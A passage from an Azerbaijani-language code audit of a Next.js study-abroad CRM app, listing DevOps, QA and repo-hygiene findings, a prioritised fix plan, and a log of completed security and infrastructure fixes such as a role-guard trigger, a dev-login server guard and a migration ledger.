**Həll:** `src/app/global-error.tsx` + admin/dashboard layout-ları yanında `error.tsx`.

**✅ Tətbiq edildi:** 3 fayl yaradıldı — `src/app/global-error.tsx` (root layout üçün, plain strings + inline style, çünki provider/CSS çökmüş ola bilər), `src/app/admin/error.tsx`, `src/app/[locale]/dashboard/(app)/error.tsx` (hər ikisi `useTranslations('Errors')` ilə, mövcud marketing error.tsx stilinə uyğun).

### D5. Migration ledger yoxdur — ORTA ✅ Tamamlandı
**Fayl:** `scripts/migrate.ts:55-65`

**Problem:** `schema_migrations` cədvəli yoxdur; hər `db:migrate` 12 faylı yenidən işlədir. İndi yalnız `IF NOT EXISTS`-ə görə sağ qalır. Bir qeyri-idempotent migration = səssiz xəta.

**Həll:** `schema_migrations(filename)` cədvəli + `pg_advisory_lock` + hər fayl üçün transaction.

**✅ Tətbiq edildi:** `scripts/migrate.ts`-ə əlavə edildi — `public.schema_migrations(filename, applied_at)` cədvəli; hər migration artıq tətbiq olunubsa skip edilir; hər fayl transaction içində işlədilib və ledger-ə yazılır; `pg_advisory_lock($1)` paralel run-ların race-ini bloklayır. `--reset` ledgəri də sıfırlayır (düzgün davranış).

### D6. Error monitoring/observability yoxdur — YÜKSƏK
**Problem:** Sentry/Datadog/structured logger yoxdur; serverless-də `console.*` buxarlanır. Lead capture fail-open (`leads.ts:69`) monitoringsiz = səssizcə itən lead-lər.

**Həll:** `@sentry/nextjs` + structured logger.

### D7. `/api/health` yoxdur — ORTA
**Həll:** `api/health/route.ts` → `{ ok: true }` (opsiyonal DB ping).

### D8. Pre-commit hook yoxdur — ORTA
**Yer:** `.husky/`, lint-staged — **mövcud deyil**

**Həll:** `husky` + `lint-staged` (staged fayllarda `eslint --fix` + `prettier --write`); `pre-push`-da `tsc --noEmit`.

### D9. docker-compose zəif default credential — AŞAĞI
**Fayl:** `docker-compose.yml:7` (`study`/`study`)

**Həll:** `${POSTGRES_PASSWORD:-study}` ilə default-la.

**✅ Güclü tərəflər:** `.env.example` yaxşı təşkil olunub, `docker-compose.yml` lokal DB üçün mövcuddur.

---

## 🧪 SENIOR QA ENGINEER

### Q1. "kanban drag" testində drag yoxdur — ORTA
**Fayl:** `tests/e2e/admin.spec.ts:4`

**Problem:** Başlıq drag-and-drop iddia edir, amma gövdə yalnız login→Leads→"New" görür.

**Həll:** Drag testi yaz və ya adını dəyiş.

### Q2. Zod schema-lar üçün unit test yoxdur — ORTA
**Fayllar:** `src/lib/validations/lead.ts`, `student.ts`, `crm.ts`

**Həll:** `validations.test.ts` — honeypot, telefon regex, enum fallback-ləri üçün accept/reject case-ləri.

### Q3. e2e yalnız Desktop Chromium — ORTA
**Fayl:** `playwright.config.ts:15`

**Problem:** Firefox/WebKit yoxdur; lokal `en-US` hardcode (17 lokal + RTL örtülmür); auth-guard negativ testləri yoxdur (`/admin` auth-sız redirect). Test-lər tamamilə `DEV_AUTH_ENABLED`-ə bağlıdır.

**Həll:** `firefox`+`webkit` project-ləri, `{ locale: 'ar' }` RTL project-i, `/admin` və `/dashboard` üçün unauthenticated-access testləri.

### Q4. React komponent/hook/form testi yoxdur — AŞAĞI
**Fayl:** `vitest.config.ts:29` (`environment:'node'`); `jsdom` quraşdırılıb amma istifadə olunmur

**Həll:** `tests/unit/components/**` üçün jsdom override; `error.tsx` və form komponentlərini ört.

### Q5. RLS role-escalation / devLogin bypass üçün test yoxdur — ORTA (qismən ✅)
Security tapıntıları (#1, #9) test coverage-də əks olunmayıb.

**✅ Qismən:** `student-repository.test.ts`-də email-escalation security property testi əlavə edildi (#3 üçün). Qalıyor: RLS trigger-in Supabase-də testi, `devLogin` bypass (DEV_AUTH_ENABLED=0) testi.

### Q6. ESLint `no-unused-vars` warning, error deyil — AŞAĞI
**Fayl:** `.eslintrc.json:4`

**Həll:** `"error"` et və ya CI-də `--max-warnings 0`.

**✅ Güclü tərəflər:** Unit test suite keyfiyyətlidir — `repository.test.ts` real seed data üzərində, `pg-university-repository.test.ts` mock Pool ilə SQL formasını doğrulayır, `i18n.test.ts` hər lokalın RTL təsnifatını yoxlayır.

---

## 🗑️ REPO GİGİYENASI

İzlənən artıq fayllar (commit `078de63`):
- `design/` — **10 fayl** (skrinşotlar, ~2.5MB) → ayrı repo/branch-a köçür
- `_uni-page-backup.tsx` — dead code backup
- `faza3.md`, `faza4.md`, `faza5.md`, `a.md`, `cl.md`, `Study.md`, `etmeli-olduglarimi-mene-et.md` — iş qeydləri
- `browser-test-result.txt`, `curl-status.txt`, `dev-*.txt`, `fetch-results.txt`, `list-body*.html`, `robocopy-*.txt`, `routes-test-result.txt`, `fetch-test.ps1`, `test-browser.cjs`, `test-pg.ts`, `test-routes.cjs` — debug/scrape artifact-ləri

**Həll:** `git rm` + `.gitignore` genişləndir: `/*.txt`, `/*.html`, `/*.cjs`, `/test-*.{ts,ps1,cjs}`, `/_*-backup.*`, `/design/`, `/faza*.md`.

---

## TƏKRARLANAN MÖVZULAR

1. **Təhlükəsizlik sərhədi yalnız app kodudur** — RLS ölü (superuser) + policy-də role dəliyi (#S1, B tapıntıları). Ən vacib tək mövzu.
2. **Auth mərkəzsiz və xətalı** — middleware qorumur, layout hər yerdə oxuyur (ISR pozur), dev cookie imzalanmamış, email ilə link.
3. **Heç bir avtomatlaşma yoxdur** — CI, hooks, migration ledger, env validation, health, monitoring.
4. **i18n yarı-bitib** — RTL qırıq, 14 lokal 2 namespace çatışmır, hardcoded string-lər, chat widget 4 lokalda.
5. **Repo gigiyenası** — debug/scrape/backup/notes commit olunub.

---

## TƏKLİF OLUNAN DÜZƏLİŞ SIRASI

| Mərhələ | Tapıntılar | Prioritet | Status |
|---|---|---|---|
| **1. Təhlükəsizlik təcili** | S1/Security #1 (role escalation) ✅, Security #3 (email link) ✅, #5 (dev cookie NODE_ENV gate) ✅, #9 (devLogin guard) ✅ | 🔴 Kritik | ✅ Tamam (4/4) |
| **2. Əsas qoyma** | D1 (CI) ✅, D2 (db:reset guard) ✅, D3 (env validation) ✅, D4 (global-error) ✅, D5 (migration ledger) ✅ | 🔴 Kritik | ✅ Tamam (5/5) |
| **3. Auth mərkəzləşdirmə + ISR** | B1 ✅, F6 ✅, A3 ✅, middleware #6 ✅ | 🟠 Yüksək | ✅ Tamam (4/4) |
| **4. SEO düzəlişləri** | S1 (ölkə canonical), S2 (domain), S3 (OG), S4 (robots), S5 (stub lokal noindex) | 🟠 Yüksək | ⬜ |
| **5. Frontend performans/UI** | F3, F4, F7, U1, U2, U3 | 🟠 Orta | ⬜ |
| **6. QA genişləndirmə** | Q1-Q6 | 🟡 Orta | ⬜ |
| **7. Repo təmizliyi** | gigiyena bölməsi | 🟡 Aşağı | ⬜ |
| **8. Təkamül** | Redis rate limit, CSP nonce, dark mode, observability | 🟡 Aşağı | ⬜ |

### ✅ Tamamlanan düzəlişlər (2026-08-08)

**Mərhələ 1.1 — RLS `role` guard trigger** (`supabase/migrations/0013_role_guard.sql`)
- `profiles` cədvəlində `before update` trigger əlavə edildi: auth context-i olan (real istifadəçi) non-admin sessiyaların `role` dəyişdirməsini bloklayır; service-role/superuser (auth.uid() NULL) app yoluna icazə verir.
- `scripts/migrate.ts` `SKIP_LOCAL`-a əlavə edildi (Supabase-only).

**Mərhələ 1.2 — `devLogin`/`devStudentLogin` server-side qorunması** (`src/app/actions/admin-auth.ts`, `student-auth.ts`)
- Hər iki action-un başına `if (!isDevAuthEnabled()) return { ok: false as const }` əlavə edildi — artıq yalnız UI-də gizlədilmir, server-də də yoxlanılır.

**Mərhələ 1.3 — Email ilə avtolink privilege escalation** (`src/lib/crm/pg-repository.ts`)
- `getStaffProfileByAuthUid`: email-linking silindi, yalnız `auth_uid` ilə resolve.
- `upsertStudentByAuthUid`: email-linking `and role = 'student'` ilə məhdudlaştırıldı.
- `tests/unit/student-repository.test.ts`: test security property-ni yoxlayır (2 yeni/yenilənmiş test).

**Mərhələ 1.4 — Dev-auth NODE_ENV gate** (`src/lib/crm/student-session.ts`)
- `isDevAuthEnabled()`-ə `&& process.env.NODE_ENV !== 'production'` əlavə edildi — bütün dev-auth subsistemi (cookie oxuyucuları + devLogin action-ları) production-da tamamilə inert. Flag sızsa belə cookie qurulmuş forgersə null qaytarır.

**Mərhələ 2.1 — db:reset guard + migration ledger** (`scripts/migrate.ts`)
- `isLocalDatabase(url)`: `--reset` yalnız lokal DB-də icazə verir.
- `schema_migrations(filename)` cədvəli: hər migration bir dəfə işləyir (skip əgər artıq tətbiq edilib), hər biri transaction içində.
- `pg_advisory_lock`: paralel migrate run-ları bloklanır.

**Mərhələ 2.2 — Build-time env validation** (`next.config.mjs`)
- `assertEnv()`: production build-də `DATABASE_URL` həmişə, Supabase var-ları isə yalnız `SUPABASE_ENABLED==='true'`-da tələb olunur; çatışmazlıqda build-i dayandırır.

**Mərhələ 2.3 — Error boundaries** (`src/app/global-error.tsx`, `admin/error.tsx`, `[locale]/dashboard/(app)/error.tsx`)
- Root layout çökməsi üçün `global-error.tsx` (inline style, provider-asılı deyil).
- Admin və dashboard üçün lokallaşdırılmış `error.tsx` (`useTranslations('Errors')`).

**Mərhələ 2.4 — CI pipeline** (`.github/workflows/ci.yml`)
- `lint-typecheck` job (sürətli, DB-siz) + `test-build` job (Postgres 16 service + migrate+seed + unit test + production build). `push`/`pull_request`-da işləyir.

**Mərhələ 3.1 — ISR bərpası (auth layout-dan köçürülüb)** (`src/app/[locale]/(marketing)/layout.tsx`, `src/components/layout/header.tsx`, yeni `src/app/api/me/route.ts`)
- Layout `getStudentSessionForLayout()` silindi → marketing səhifələri yenidən statik (ISR). `Header` client-side `/api/me` fetch ilə sessiyanı həll edir; `session` prop yoxdur. `useSearchParams` → `window.location` (Suspense tələbi yoxdur).

**Mərhələ 3.2 — Mobil auth girişi** (`src/components/layout/header.tsx`)
- Mobil menüyə `{AuthControl()}` əlavə edildi (F6).

**Mərhələ 3.3 — Student action auth axını** (`src/lib/crm/student-session.ts`, `src/app/actions/student.ts`)
- `getStudentSessionAny()` (Supabase+dev, redirect-siz) əlavə edildi; 3 action-da `getStudentSession` → `getStudentSessionAny`.

**Mərhələ 3.4 — Mərkəzi middleware** (`src/middleware.ts`)
- `getSession()` → `getUser()`; `/admin/*` üçün mərkəzi gate (auth-sız → login redirect, dev-auth-a hörmət); matcher `admin`-ı əhatə edir.

**Yoxlama:** `npm run typecheck` ✅ (0 xəta), `npm run lint` ✅ (0 xəta, 2 əvvəlki warning — mənim dəyişikliklərim deyil).

---

*Hər tapıntı `file:sətir` referensı ilə fakt kodla doğrulanıb. Bu sənəd iki müstəqil auditin birləşməsidir.*
